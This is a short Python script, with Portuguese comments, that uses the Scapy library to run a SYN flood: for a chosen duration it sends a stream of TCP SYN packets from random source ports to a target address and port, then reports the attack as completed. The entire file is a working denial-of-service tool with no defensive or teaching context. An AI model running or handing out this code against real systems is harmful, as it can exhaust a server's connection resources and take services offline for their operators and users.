import time
from scapy.all import send, IP, TCP
import random

def syn_flood(target_ip, target_port, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        # Gera um número de porta aleatório para a origem
        src_port = random.randint(1024, 65535)

        # Constrói o pacote IP/TCP
        packet = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")

        # Envia o pacote
        send(packet, verbose=False)

    print("SYN Flood attack completed.")